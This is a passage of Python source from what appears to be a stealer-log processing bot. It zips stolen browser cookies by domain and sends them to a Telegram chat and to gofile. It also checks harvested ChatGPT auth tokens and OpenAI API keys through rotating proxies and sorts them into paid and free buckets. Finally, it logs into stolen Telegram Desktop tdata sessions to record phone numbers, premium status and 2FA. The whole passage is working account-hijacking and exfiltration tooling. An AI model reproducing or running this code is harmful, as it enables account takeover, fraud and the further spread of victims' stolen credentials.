        sys.stdout.write("gofile servers: %s\n" % e); return None
    for s in srv[:3]:
        try:
            with open(path, "rb") as fh:
                r = requests.post("https://%s.gofile.io/contents/uploadfile"
                                  % s.get("name"),
                                  files={"file": (os.path.basename(path), fh)},
                                  timeout=1800)
            d = r.json()
            if d.get("status") == "ok":
                return (d.get("data") or {}).get("downloadPage")
            sys.stdout.write("gofile %s: %s\n" % (s.get("name"), str(d)[:160]))
        except Exception as e:
            sys.stdout.write("gofile %s error: %s\n" % (s.get("name"), e))
    return None

SPECS = {}
Q = queue.Queue()
TG_CAP = 45 << 20          # stays clear of Telegram's 50 MB bot upload limit

def split_zip(zp):
    """Roll an oversized zip into <name>.partN.zip files, each a valid archive on
    its own. Entries are copied whole (STORED — re-deflating an already packed
    inner zip buys nothing and burns a core), and found_in.txt is repeated in
    every part so no part loses its manifest."""
    idx, raw, cur = 0, 0, None
    with zipfile.ZipFile(zp) as src:
        infos = [i for i in src.infolist() if not i.is_dir()]
        man = next((i for i in infos if i.filename.lower() == "found_in.txt"), None)
        blob_man = src.read(man) if man else None
        for inf in infos:
            if inf is man:
                continue
            blob = src.read(inf)
            if cur is not None and raw + len(blob) > TG_CAP:
                cur.close(); cur = None
            if cur is None:
                idx += 1
                cur = zipfile.ZipFile(OUT / ("%s.part%d.zip" % (zp.stem, idx)),
                                      "w", zipfile.ZIP_STORED)
                raw = 0
                if blob_man is not None:
                    cur.writestr(man.filename, blob_man)
            cur.writestr(inf, blob, zipfile.ZIP_STORED)
            raw += len(blob)
            if raw > TG_CAP:                 # one entry alone breaks the cap
                sys.stdout.write("part %d holds a %s entry that is too big for "
                                 "Telegram on its own\n" % (idx, fs(raw)))
                sys.stdout.flush()
        if cur is not None:
            cur.close()
    return [p for p in (OUT / ("%s.part%d.zip" % (zp.stem, i)) for i in range(1, idx + 1))
            if p.exists() and p.stat().st_size > 0]

def ship(zp, cap):
    """Send one result zip. Telegram-sized files go whole; anything bigger is
    split into parts and the complete archive is handed over as a gofile link —
    nobody wants to re-join parts by hand. cap(size, idx, count, total, split)
    builds the caption. Returns (parts sent, full-zip link or None)."""
    tot = zp.stat().st_size if zp.exists() else 0
    if not tot:
        return 0, None
    if tot <= TG_CAP:
        return (1 if upload(str(zp), cap(tot, 1, 1, tot, False)) else 0), None
    parts = split_zip(zp)
    sent = sum(1 for i, p in enumerate(parts, 1)
               if upload(str(p), cap(p.stat().st_size, i, len(parts), tot, True)))
    if not sent:
        return 0, None
    url = gofile(str(zp))
    if not url:
        sys.stdout.write("gofile link for %s failed\n" % zp.name); sys.stdout.flush()
    for p in parts:
        try: p.unlink()
        except Exception: pass
    return sent, url

def ship_note(idx, count, size, tot, split, label):
    """Shared size / part line for every shipped archive."""
    if split:
        return (f"📦 {bold('Part')}    {code(idx)} / {code(count)}\n"
                f"✂️ {bold('Split')}   {code(fs(tot))} broke Telegram's 50 MB cap — "
                f"the whole {code(label)} rides on the link below\n")
    return f"📦 {bold('Size')}   {code(fs(size))}\n"

def deliver(packed, task):
    """Post every domain zip (and each part of a split domain) to the chat.
    A domain that had to be split also gets its combined zip on gofile."""
    sent, failed, links = [], [], {}
    for dom, cnt in (packed or {}).items():
        base = re.sub(r"[^\w.-]", "_", dom.lower())
        parts = sorted(p for p in OUT.glob(base + "*.zip")
                       if re.fullmatch(re.escape(base) + r"(\.part\d+)?\.zip", p.name))
        if not parts:
            failed.append(dom)
            continue
        ok_all = True
        for zp in parts:
            tot = sum(p.stat().st_size for p in parts)
            cap = (f"{gold_header('COOKIES READY', esc(dom))}\n{THIN}\n"
                   f"🍪 {bold('Sessions')}  {code(cnt)}\n"
                   f"📦 {bold('Size')}      {code(fmt_size(zp.stat().st_size))}"
                   + (f" of {code(fmt_size(tot))} total" if len(parts) > 1 else "") + "\n"
                   f"🗂 {bold('Part')}      {code(parts.index(zp) + 1)} / {code(len(parts))}\n"
                   f"📄 {bold('Layout')}    numbered .txt at zip root\n"
                   f"⏱ {bold('Job time')}  {code(fmt_time(time.time() - (PB[2] or time.time())))}\n"
                   f"🖥 {bold('VM')}        {code(SPECS.get('cores', '?'))} vCPU · "
                   f"{code(SPECS.get('ram', '?'))}")
            if not upload(str(zp), cap):
                ok_all = False
        (sent if ok_all else failed).append(dom)
        if len(parts) > 1:
            full = OUT / ("%s.full.zip" % base)
            if full.exists():
                url = gofile(str(full))
                if url:
                    links[dom] = url
                else:
                    sys.stdout.write("full-zip link failed for %s\n" % dom)
    return sent, failed, links

def deliver_auth(auths):
    """Send auth.zip (1st_auth.json, 2nd_auth.json…) to the chat.
    Returns (sent, file_id) — the file id lets the bot re-download this exact
    archive and run the proxy check on it after the job ends."""
    zp, rels = pack_auth(auths)
    if zp is None:
        return False, None
    shown = "\n".join(code("%s ← %s" % (n, r[:58])) for n, r in rels[:10])
    size_line = f"📦 {bold('Size')}   {code(fmt_size(zp.stat().st_size))}\n"
    cap = (f"{gold_header('AUTH.JSON FILES', esc(str(len(auths)) + ' found'))}\n{THIN}\n"
           + size_line
           + f"🗂 {bold('Names')}  1st_auth.json, 2nd_auth.json …\n"
           + shown
           + ("\n…" if len(rels) > 10 else ""))
    if not TG or not CHAT:
        return False, None
    if zp.stat().st_size > TG_CAP:
        def auth_cap(size, idx, count, tot, split):
            return (cap.replace(size_line, "") + "\n"
                    + ship_note(idx, count, size, tot, split, "auth.zip")
                    + f"🔎 {bold('Re-check')}  parts cannot be re-downloaded as one "
                      f"archive, so the bot-side proxy check is skipped for this job")
        sent_parts, _ = ship(zp, auth_cap)
        return sent_parts > 0, None
    try:
        with open(zp, "rb") as fh:
            r = requests.post(TG_API + "sendDocument",
                              data={"chat_id": CHAT, "caption": cap,
                                    "parse_mode": "HTML"},
                              files={"document": (zp.name, fh)}, timeout=300)
        if r.status_code == 200:
            fid = (((r.json().get("result") or {}).get("document") or {})
                   .get("file_id"))
            return True, fid
        sys.stdout.write("tg send %s: %s\n" % (zp.name, r.text[:200]))
        sys.stdout.flush()
        return False, None
    except Exception as e:
        sys.stdout.write("tg send error: %s\n" % e); sys.stdout.flush()
        return False, None

# ── auth.json proxy check (did the user request it in step 4?) ─────────────
AUTH_PROXY_URL   = "https://etherealproxyfetch.onrender.com/live.txt"
AUTH_PREMIUM     = ("plus", "pro", "team", "enterprise", "go")

def auth_fetch_proxies():
    """Live proxy lines from the feed; [] means checks try the direct route."""
    try:
        r = requests.get(AUTH_PROXY_URL, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
        if r.status_code == 200:
            out = []
            for l in r.text.splitlines():
                p = l.strip()
                if not p or p.startswith("#"): continue
                out.append(p if "://" in p else "http://" + p)
            if out:
                return out
    except Exception as e:
        sys.stdout.write("auth proxies: %s\n" % e); sys.stdout.flush()
    return []

def auth_jwt(tok):
    import base64
    try:
        p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p).decode("utf-8"))
    except Exception:
        return {}

def auth_check_one(rel, path, proxy):
    res = {"name": rel, "status": "dead", "reason": "", "email": "-",
           "plan": "-", "expires": "-", "proxy": proxy or "direct", "token": ""}
    try:
        data = json.load(open(path, encoding="utf-8-sig", errors="ignore"))
    except Exception as e:
        res["reason"] = "invalid json: %s" % str(e)[:40]; return res
    if not isinstance(data, dict):
        res["reason"] = "not a json object"; return res
    tokens = data.get("tokens") if isinstance(data.get("tokens"), dict) else {}
    access = tokens.get("access_token") or ""
    idt = tokens.get("id_token") or ""
    ak = data.get("OPENAI_API_KEY") or ""
    px = ({"http": proxy, "https": proxy} if proxy else None)
    H = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                       "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Accept": "application/json"}
    if not access and str(ak).startswith("sk-"):
        res.update(token=ak, plan="API")
        try:
            r = requests.get("https://api.openai.com/v1/models",
                             headers=dict(H, Authorization="Bearer " + ak),
                             proxies=px, timeout=20)
            res["reason"] = "HTTP %s" % r.status_code
            res["status"] = ("api" if r.status_code == 200 else
                             "dead" if r.status_code == 401 else "error")
        except Exception as e:
            res.update(status="error", reason="net: %s" % str(e)[:30])
        return res
    if not access or not idt:
        res["reason"] = "missing access_token / id_token"; return res
    res["token"] = access
    payload = auth_jwt(idt)
    res["email"] = payload.get("email", "Unknown")
    ai = payload.get("https://api.openai.com/auth") or {}
    res["plan"] = str(ai.get("chatgpt_plan_type", "Free") or "Free")
    until = str(ai.get("chatgpt_subscription_active_until", "-") or "-")
    if "T" in until: until = until.split("T")[0]
    res["expires"] = until
    exp = None
    try: exp = float(auth_jwt(access).get("exp"))
    except Exception: pass
    if exp and exp < time.time():
        res.update(status="expired",
                   reason="jwt expired %s" % time.strftime("%Y-%m-%d", time.gmtime(exp)))
        return res
    try:
        r = requests.get("https://chatgpt.com/backend-api/me",
                         headers=dict(H, Authorization="Bearer " + access),
                         proxies=px, timeout=25)
        res["reason"] = "HTTP %s" % r.status_code
        res["status"] = ("live" if r.status_code == 200 else
                         "expired" if r.status_code == 401 else "error")
    except Exception as e:
        res.update(status="error", reason="net: %s" % str(e)[:30])
    return res

def check_auths(auths):
    """Check every found auth.json (15 threads, live card). Writes the result
    files, uploads auth_report.zip and returns ck_* counts for the payload."""
    from concurrent.futures import ThreadPoolExecutor
    total = len(auths)
    tick("authcheck", 93, auth_total=total, checked=0, live=0, expired=0,
         dead=0, err=0, proxies=0)
    proxies = auth_fetch_proxies()
    if stop():
        return {}

    # search_pack() hands back bare paths; accept (rel, path) pairs too
    pairs = []
    for it in auths:
        if isinstance(it, (tuple, list)):
            pairs.append((str(it[0]), str(it[1])))
            continue
        p = it
        try:
            rel = str(p.relative_to(WORK / "ex"))
        except Exception:
            rel = p.name
        pairs.append((rel, str(p)))
    total = len(pairs)
    results = [None] * total
    MAX_TRY = 3

    def run_pass(pending, seed):
        """One check pass over the pending indexes; False when cancelled.
        The last pass always drops the proxies and tries the direct route."""
        def one(i):
            rel, path = pairs[i]
            proxy = None
            if proxies and seed < MAX_TRY - 1:
                proxy = proxies[(seed * 7919 + i) % len(proxies)]
            try:
                return auth_check_one(rel, path, proxy)
            except Exception as e:
                return {"name": rel, "status": "error", "reason": "thread: %s" % e,
                        "email": "-", "plan": "-", "expires": "-",
                        "proxy": proxy or "direct", "token": ""}
        with ThreadPoolExecutor(max_workers=min(15, max(1, len(pending)))) as exr:
            for j, res in enumerate(exr.map(one, pending)):
                if stop():
                    return False
                results[pending[j]] = res
                done_list = [r for r in results if r is not None]
                lv_n = sum(1 for r in done_list if r["status"] in ("live", "api"))
                pm_n = sum(1 for r in done_list if r["status"] == "live"
                           and r["plan"].lower() in AUTH_PREMIUM)
                tick("authcheck", 93 + min(len(done_list) * 5 // max(total, 1), 5),
                     auth_total=total, checked=len(done_list), live=lv_n,
                     expired=sum(1 for r in done_list if r["status"] == "expired"),
                     dead=sum(1 for r in done_list if r["status"] == "dead"),
                     err=sum(1 for r in done_list if r["status"] == "error"),
                     prem=pm_n, free=lv_n, proxies=len(proxies) or 1,
                     rechecking=len(pending))
        return True

    pending = list(range(total))
    for round_n in range(MAX_TRY):
        if not pending:
            break
        if not run_pass(pending, round_n):
            return {}
        pending = [i for i in range(total)
                   if results[i] and results[i]["status"] == "error"]
    for i, r in enumerate(results):
        # leftovers after all rounds: classify as unreachable-BAD, no ERROR bucket
        if r is None:
            r = {"name": pairs[i][0], "status": "dead", "reason": "no result",
                 "email": "-", "plan": "-", "expires": "-", "proxy": "-", "token": ""}
        elif r.get("status") == "error":
            r["status"] = "dead"
            r["reason"] = ("unreachable after %d attempts (%s)"
                           % (MAX_TRY, r.get("reason", "")))
        results[i] = r

    def aline(r):
        return ("File: %s\nEmail: %s | Plan: %s | Exp: %s\n"
                % (r["name"], r["email"], r["plan"], r["expires"])
                + ("Token: %s\n" % r["token"] if r["token"] else "")
                + ("Status: %s | %s\nProxy: %s\n%s\n"
                   % (r["status"], r["reason"], r["proxy"], "-" * 48)))
    prem_set = [r for r in results if r["status"] == "live"
                and r["plan"].lower() in AUTH_PREMIUM]
    free_set = [r for r in results if r["status"] in ("live", "api")
                and r["plan"].lower() not in AUTH_PREMIUM]
    exp_set  = [r for r in results if r["status"] == "expired"]
    dead_set = [r for r in results if r["status"] == "dead"]
    err_set  = [r for r in results if r["status"] == "error"]
    live_set = prem_set + free_set
    src_by_name = {rel: path for rel, path in pairs}
    num_of = {rel: n for n, (rel, _p) in enumerate(pairs, 1)}

    def wfile(name, rows, head=""):
        (OUT / "results").mkdir(parents=True, exist_ok=True)
        with open(OUT / name, "w", encoding="utf-8") as f:
            f.write(head)
            for r in rows: f.write(aline(r))

    wfile("results/premium_hits.txt", prem_set,
          head=("==================================================\n   PREMIUM HITS\n"
                "==================================================\n\n") if prem_set else "")
    wfile("results/free_hits.txt", free_set)
    wfile("results/expired.txt", exp_set)
    wfile("results/dead.txt", dead_set)
    wfile("results/errors.txt", err_set)

    # ── bucket folders: PAID / FREE / EXPIRED / BAD / ERROR ──
    # each holds the real auth.json copies, renamed paid_1st_auth.json …
    PREFIX = {"PAID": "paid", "FREE": "free", "EXPIRED": "expired",
              "BAD": "bad", "ERROR": "error"}
    fold_of = {"PAID": prem_set, "FREE": free_set, "EXPIRED": exp_set,
               "BAD": dead_set, "ERROR": err_set}
    _sh = shutil
    try:
        (OUT / "results").mkdir(parents=True, exist_ok=True)
        for fold, rows in fold_of.items():
            if not rows:
                continue          # skip empty buckets — no empty folders in the zip
            d = OUT / "results" / fold
            d.mkdir(parents=True, exist_ok=True)
            hits = ""
            for r in rows:
                num = num_of.get(r["name"], 1)
                try:
                    _sh.copy(src_by_name[r["name"]],
                             str(d / ("%s_%s_auth.json" % (PREFIX[fold], ordn(num)))))
                except Exception:
                    pass
                hits += aline(r)
            with open(d / "hits.txt", "w", encoding="utf-8") as f:
                f.write(hits)
    except Exception as e:
        sys.stdout.write("auth folders: %s\n" % e); sys.stdout.flush()
    try:
        with open(OUT / "results/all_results.json", "w", encoding="utf-8") as f:
            json.dump(results, f, ensure_ascii=False)
        with open(OUT / "results/proxies_used.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(proxies) + "\n")
    except Exception as e:
        sys.stdout.write("auth result files: %s\n" % e); sys.stdout.flush()

    report = (
        "==================================================\n   AUTH CHECKER REPORT\n"
        "   %s\n" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) +
        "==================================================\n\n"
        "Total auth files     : %d\n" % total +
        "Proxies loaded       : %d\n" % len(proxies) +
        "Attempts per file    : up to %d (errors re-checked)\n\n" % MAX_TRY +
        "Valid tokens         : %d\n" % len(live_set) +
        "  PAID (Plus/Pro/…)  : %d\n" % len(prem_set) +
        "  FREE               : %d\n" % len(free_set) +
        "Expired tokens       : %d\n" % len(exp_set) +
        "Dead / invalid (BAD) : %d\n" % len(dead_set) +
        "Check errors (ERROR) : %d\n\n" % len(err_set) +
        "Live accounts        : %d (paid %d, free %d)\n"
        % (len(live_set), len(prem_set), len(free_set)) +
        "Dead accounts        : %d\n\n" % (len(dead_set) + len(exp_set)) +
        "--- VALID ---\n" + ("".join(aline(r) for r in live_set) or "  none\n") +
        ("--- EXPIRED ---\n%s" % "".join(aline(r) for r in exp_set) if exp_set else "") +
        ("--- DEAD ---\n%s" % "".join(aline(r) for r in dead_set) if dead_set else "") +
        ("--- ERRORS ---\n%s" % "".join(aline(r) for r in err_set) if err_set else ""))
    zpath = OUT / "auth_report.zip"
    try:
        with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("report.txt", report)
            for rel, path in pairs:
                try: z.write(path, "source/" + rel.replace("\\", "_"))
                except Exception: pass
            for fp in sorted((OUT / "results").rglob("*")):
                if fp.is_file():
                    z.write(fp, "results/" + str(fp.relative_to(OUT / "results")))
        cap = (f"{gold_header('AUTH CHECK DONE', esc(str(len(results)) + ' files'))}\n{THIN}\n"
               f"✅ {bold('Valid')}    {code(len(live_set))} "
               f"(💰 {len(prem_set)} premium / 🆓 {len(free_set)} free)\n"
               f"⏳ {bold('Expired')}  {code(len(exp_set))}   "
               f"❌ {bold('Dead')} {code(len(dead_set))}\n"
               f"⚠️ {bold('Errors')}   {code(len(err_set))}   "
               f"🌍 {bold('Proxies')} {code(len(proxies))}")
        okzip = upload(str(zpath), cap)
    except Exception as e:
        sys.stdout.write("auth zip: %s\n" % e); sys.stdout.flush()
        okzip = False
    return {"ck_total": len(results), "ck_live": len(live_set),
            "ck_prem": len(prem_set), "ck_free": len(free_set),
            "ck_exp": len(exp_set), "ck_dead": len(dead_set),
            "ck_err": len(err_set), "ck_zip": bool(okzip),
            "ck_proxies": len(proxies)}

def find_tdata(root):
    """Exact-name match first: every folder literally named tdata / tdata2…
    at any depth. If NOTHING in the archive is named tdata, the signature
    files catch it (D877F783D4D88E81, map0/map1, key_datas, usertag…)."""
    out = []
    for p in root.rglob("*"):
        try:
            is_dir = p.is_dir()
        except OSError:
            continue
        if not is_dir:
            continue
        n = p.name.lower()
        if n == "tdata" or (n.startswith("tdata")
                            and (len(n) == 5 or n[5:].isdigit())):
            if not any(str(p).startswith(str(a) + os.sep) for a in out):
                out.append(p)
    sig = {"d877f783d4d88e81", "map0", "map1", "key_datas", "usertag",
           "shortcuts-default", "key_data"}
    extra = []
    for p in root.rglob("*"):
        try:
            is_dir = p.is_dir()
        except OSError:
            continue
        if not is_dir:
            continue
        try:
            names = {c.name.lower() for c in p.iterdir()}
        except OSError:
            continue
        if not sig & names:
            continue
        covered = any(str(p) == str(a) or str(p).startswith(str(a) + os.sep)
                      for a in out + extra)
        if not covered:
            extra.append(p)
    return out + extra

def pack_tdata(dirs):
    """tdata.zip holds every found folder as a PLAIN folder tree — no zip inside
    a zip. Each entry is keyed by the folder's own path inside the extracted
    archive, so hundreds of folders all named "tdata" never collide, and
    found_in.txt maps every path back to where it came from."""
    if not dirs:
        return None, 0
    zp = OUT / "tdata.zip"
    manifest, total, used = [], 0, {""}
    roots = [WORK / "ex", WORK / "tdex", WORK / "tdfull"]
    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as big:
        for d in dirs:
            rel = d.name
            for root in roots:
                try:
                    rel = str(d.relative_to(root))
                except Exception:
                    continue
                if root != WORK / "ex":
                    rel = "%s/%s" % (root.name, rel)
                break
            rel = re.sub(r"[^\w./-]", "_", rel.strip("/")) or d.name
            while rel.lower() in used:                     # two hunt passes, same path
                rel = rel + "_2"
            used.add(rel.lower())
            files = 0
            for f in sorted(d.rglob("*")):
                try:
                    if f.is_file():
                        big.write(str(f), "%s/%s" % (rel, f.relative_to(d)))
                        files += 1
                except Exception:
                    pass
            if files:
                total += 1
                manifest.append("%s/  (%d files)" % (rel, files))
            else:
                manifest.append("(empty) %s/" % rel)
        big.writestr("found_in.txt",
                     "TDATA FOLDERS IN THIS ARCHIVE\n%s\nEvery folder below is a plain\n"
                     "folder inside tdata.zip (unzip and use it directly):\n\n%s\n" %
                     ("=" * 48, "\n".join(manifest)))
    return zp, total

TOKEN_NAMES = ("tokens.txt", "token.txt")

def check_tdata(tdirs):
    """Runs on the RUNNER: proxy-check every tdata. Live card, buckets zip.
    Returns tk_* dict for the payload. Never raises."""
    from concurrent.futures.thread import ThreadPoolExecutor
    out = {"tk_total": len(tdirs), "tk_valid": 0, "tk_prem": 0, "tk_2fa": 0,
           "tk_frozen": 0, "tk_dead": 0, "tk_err": 0, "tk_zip": False}
    if stop():
        return out
    if not tdirs:
        return out
    proxies = auth_fetch_proxies()
    out["tk_proxies"] = len(proxies)
    sys.stdout.write("tdcheck: %d folders, %d proxies\n"
                     % (len(tdirs), len(proxies))); sys.stdout.flush()
    tick("tdatacheck", 90, tk_total=out["tk_total"], tk_done=0,
         tk_valid=0, tk_prem=0, tk_2fa=0, tk_frozen=0, tk_dead=0, tk_err=0,
         tk_proxies=len(proxies))

    # opentele turns a tdata folder into a real telethon client; telethon
    # needs python-socks to hop through the HTTP proxies. No VPN, no VM apps —
    # everything is fetched at check time on the runner itself.
    def ensure_pkgs():
        for pkg in ("opentele", "python-socks"):
            try:
                __import__(pkg)
                continue
            except ImportError:
                pass
            subprocess.run([sys.executable, "-m", "pip", "install", "--quiet",
                            pkg], timeout=600,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            import opentele  # noqa
            return True
        except Exception as e:
            sys.stdout.write("tdcheck: opentele unavailable: %s\n" % e)
            sys.stdout.flush()
            return False
    if not ensure_pkgs():
        sys.stdout.write("tdcheck: package install failed — aborting cleanly\n")
        sys.stdout.flush()
        out["tk_err"] = len(tdirs)
        tick("tdatacheck", 96, **out)
        return out

    def parse_proxy(p):
        m = re.match(r"(\w+)://(?:([^:@]+)(?::([^@]*))?@)?([^:/]+)(?::(\d+))?", p)
        if not m:
            return None
        scheme, user, pw, host, port = m.groups()
        return (scheme.lower() or "http", user, pw, host, int(port or 80))

    # state per folder
    seen = set()
    dedup = []
    for d in tdirs:
        rp = os.path.realpath(str(d))
        if rp not in seen:
            seen.add(rp)
            dedup.append(d)
    tdirs = dedup
    out["tk_total"] = len(tdirs)
    res = [dict(orig=str(d), status="err", reason="", phone="-", user="-",
                prem=False, tfa=False, proxy="-") for d in tdirs]
    MAX_TRY = 2

    # ── dedicated "TDATA CHECKING" progress card (its own message) ──
    CARD = {"t": 0.0}

    def td_card(force=False):
        """Paint the separate live checking card — throttled to 1 edit/12s."""
        if not force and time.time() - CARD["t"] < 12:
            return
        CARD["t"] = time.time()
        done = [r for r in res if r["status"] != "err"]
        pend = [r for r in res if r["status"] == "err"]
        v = [r for r in done if r["status"] == "valid"]
        pct_v = (len(done) * 100 // max(len(res), 1)) if res else 100
        txt = (f"{gold_header('TDATA CHECKING', esc('%d / %d folders' %
               (len(done), len(res))))}\n{THIN}\n"
               f"{bar(pct_v)}\n"
               f"✅ {bold('Valid')}  {code(len(v))}  ·  👑 {bold('Premium')}  "
               f"{code(sum(1 for r in v if r['prem']))}  ·  🔒 {bold('2FA')}  "
               f"{code(sum(1 for r in v if r['tfa']))}\n"
               f"🧊 {bold('Frozen')}  {code(sum(1 for r in done if r['status'] == 'frozen'))}"
               f"  ·  💀 {bold('Dead')}  {code(sum(1 for r in done if r['status'] == 'dead'))}\n"
               f"⏳ {bold('Checking')} {code(len(pend))}  ·  🌍 {bold('Proxies')} "
               f"{code(len(proxies) or 1)}"
               + (f"  ·  🗒 {bold('Now')} {code(Path(pend[0]['orig']).name[:38])}"
                  if pend else ""))
        try:
            new_card(txt)
        except Exception:
            pass

    def progress():
        done = [r for r in res if r["status"] in ("valid", "frozen", "dead")]
        v = [r for r in done if r["status"] == "valid"]
        tick("tdatacheck", 90, tk_total=out["tk_total"], tk_done=len(done),
             tk_valid=len(v), tk_prem=sum(1 for r in v if r["prem"]),
             tk_2fa=sum(1 for r in v if r["tfa"]),
             tk_frozen=sum(1 for r in done if r["status"] == "frozen"),
             tk_dead=sum(1 for r in done if r["status"] == "dead"),
             tk_err=sum(1 for r in res if r["status"] == "err"),
             tk_proxies=len(proxies))
        td_card()

    def check_one(i, seed):
        r = res[i]
        tdir = r["orig"]
        proxy = None
        if proxies and seed < MAX_TRY - 1:
            proxy = proxies[(seed * 7919 + i) % len(proxies)]
        r["proxy"] = proxy or "direct"
        from telethon import errors, functions
        from opentele.td import TDesktop
        prox = None
        if proxy:
            scheme, user, pw, host, port = parse_proxy(proxy)
            import socks
            t = {"http": socks.HTTP, "socks4": socks.SOCKS4,
                 "socks5": socks.SOCKS5}.get(scheme, socks.SOCKS5)
            prox = (t, host, port, True, user, pw)
        try:
            td = TDesktop(tdir)
            if not td.isLoaded():
                raise RuntimeError("tdata folder failed to load/decrypt")
            c = td.ToTelethon(session=str(WORK / ("tks_%d" % i)), proxy=prox)

            import asyncio
            async def _m():
                try:
                    await c.connect()
                    if not c.is_user_authorized():
                        raise errors.UnauthorizedError(
                            None) if hasattr(errors, "UnauthorizedError") \
                            else RuntimeError("unauthorized")
                    me = await c.get_me()
                    full = await c(functions.users.GetFullUserRequest(me.id))
                    prem = bool(getattr(full.full_user, "premium", False))
                    try:
                        pwq = await c(functions.account.GetPasswordRequest())
                        tfa = bool(getattr(pwq, "current_algo", None))
                    except Exception:
                        tfa = False
                    phone = getattr(me, "phone_number", "") or "-"
                    uname = ("@" + me.username) if getattr(me, "username",
                                                           None) else (me.first_name or "-")
                    return "valid", "", str(phone), str(uname), prem, tfa
                finally:
                    try: await c.disconnect()
                    except Exception: pass
            loop = asyncio.new_event_loop()
            try:
                ret = loop.run_until_complete(asyncio.wait_for(_m(), 90))
            finally:
                loop.close()
            st_, why, phone, uname, prem, tfa = ret
            r.update(status=st_, reason=why, phone=phone, user=uname,
                     prem=prem, tfa=tfa)
        except Exception as e:
            n, m = type(e).__name__, str(e)[:90]
            if "DeactivatedBan" in n or "deactivated, ban" in m.lower() \
                    or "banned" in m.lower():
                r.update(status="frozen", reason=m)
            elif "UserDeactivated" in n or "SessionRevoked" in n \
                    or "AuthKeyUnregistered" in n or "Unauthorized" in n \
                    or "revoked" in m.lower() or "unregistered" in m.lower():
                r.update(status="dead", reason=m)
            else:
                r.update(status="err", reason=m)
        finally:
            for f in (WORK / ("tks_%d.session" % i),
                      WORK / ("tks_%d.session-journal" % i)):
                try: f.unlink(missing_ok=True)
                except Exception: pass

    tstart = time.time()
    td_card(True)
    for seed in range(MAX_TRY):
        if stop():
            return {}
        pend = [i for i, r in enumerate(res) if r["status"] == "err"]
        if not pend:
            break
        progress()
        for k in range(0, len(pend), 5):
            if stop():
                return {}
            with ThreadPoolExecutor(
                    max_workers=min(5, len(pend) - k)) as exr:
                for _ in exr.map(check_one, pend[k:k + 5], [seed] * (len(pend) - k)):
                    if stop():
                        return {}
            progress()
    td_card(True)
    sys.stdout.write("tdcheck rounds done in %.1fs\n"
                     % (time.time() - tstart)); sys.stdout.flush()

    # leftovers still error → dead bucket target but reported honestly
    for r in res:
        if r["status"] == "err":
            r["status"] = "dead"
            r["reason"] = "unreachable after %d attempts: %s" % (MAX_TRY, r["reason"])

    valid = [r for r in res if r["status"] == "valid"]
    prem  = [r for r in valid if r["prem"]]
    free  = [r for r in valid if not r["prem"]]
    twofa = [r for r in valid if r["tfa"]]
    fro   = [r for r in res if r["status"] == "frozen"]
    dead  = [r for r in res if r["status"] == "dead"]
    out.update(tk_valid=len(valid), tk_prem=len(prem), tk_2fa=len(twofa),
               tk_frozen=len(fro), tk_dead=len(dead), tk_err=0)
    tick("tdatacheck", 96, tk_total=out["tk_total"], tk_done=len(res),
         tk_valid=len(valid), tk_prem=len(prem), tk_2fa=len(twofa),
         tk_frozen=len(fro), tk_dead=len(dead), tk_err=0,
         tk_proxies=len(proxies))

    def tline(r):
        return ("Folder: %s\nPhone: %s | User: %s | Premium: %s | 2FA: %s\n"
                "Status: %s | %s\nProxy: %s\n%s\n"
                % (r["orig"].replace(str(WORK / "ex") + "/", "")
                   .replace(str(WORK / "tdex") + "/", "")
                   .replace(str(WORK / "tdfull") + "/", ""),
                   r.get("phone", "-"), r.get("user", "-"),
                   "YES" if r.get("prem") else "no",
                   "YES" if r.get("tfa") else "no",
                   r["status"], r.get("reason", ""),
                   r.get("proxy", "-"), "-" * 48))

    # buckets: VALID(VALID_P/VALID_F) FROZEN DEAD + copies of the checked folders
    try:
        (OUT / "tdresults").mkdir(parents=True, exist_ok=True)
        BASE = WORK / "ex"
        for fold, rows in (("VALID", valid), ("FROZEN", fro), ("DEAD", dead)):
            if not rows:
                continue
            d = OUT / "tdresults" / fold
            d.mkdir(parents=True, exist_ok=True)
            hits = ""
            for n, r in enumerate(rows, 1):
                tag = re.sub(r"[^\w.-]", "_",
                             r["orig"].replace(str(BASE) + "/", ""))[-60:]
                info = d / ("%s.txt" % tag)
                info.write_text(tline(r), encoding="utf-8")
                hits += tline(r)
            (d / "hits.txt").write_text(hits, encoding="utf-8")
        with open(OUT / "tdresults/all_results.json", "w", encoding="utf-8") as f:
            json.dump(res, f, ensure_ascii=False)
        with open(OUT / "tdresults/proxies_used.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(proxies) + "\n")
    except Exception as e:
        sys.stdout.write("tdcheck buckets: %s\n" % e); sys.stdout.flush()

    report = ("==================================================\n   TDATA CHECKER REPORT\n"
              "   %s\n" % time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) +
              "==================================================\n\n"
              "Total tdata folders   : %d\n" % len(res) +
              "Proxies used          : %d\n\n" % len(proxies) +
              "VALID sessions        : %d\n" % len(valid) +
              "  PREMIUM             : %d\n" % len(prem) +
              "  FREE                : %d\n" % len(free) +
              "2FA on                : %d\n" % len(twofa) +
              "FROZEN / deactivated  : %d\n" % len(fro) +
              "DEAD / revoked        : %d\n\n" % len(dead) +
              "--- VALID ---\n" + ("".join(tline(r) for r in valid) or "  none\n") +
              ("--- FROZEN ---\n%s" % "".join(tline(r) for r in fro) if fro else "") +
              ("--- DEAD ---\n%s" % "".join(tline(r) for r in dead) if dead else ""))
    zpath = OUT / "tdata_report.zip"
    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("report.txt", report)
        for fp in sorted((OUT / "tdresults").rglob("*")):
            if fp.is_file():
                z.write(fp, str(fp.relative_to(OUT / "tdresults")))
    def tdcap(size, idx, count, tot, split):
        return (f"{gold_header('TDATA CHECK DONE', esc(str(len(res)) + ' folders'))}"
                f"\n{THIN}\n"
                f"✅ {bold('Valid')}     {code(len(valid))}  👑 {bold('Premium')}  "
                f"{code(len(prem))} · ⛅ {bold('Free')}  {code(len(free))}\n"
                f"🔒 {bold('2FA on')}   {code(len(twofa))}\n"
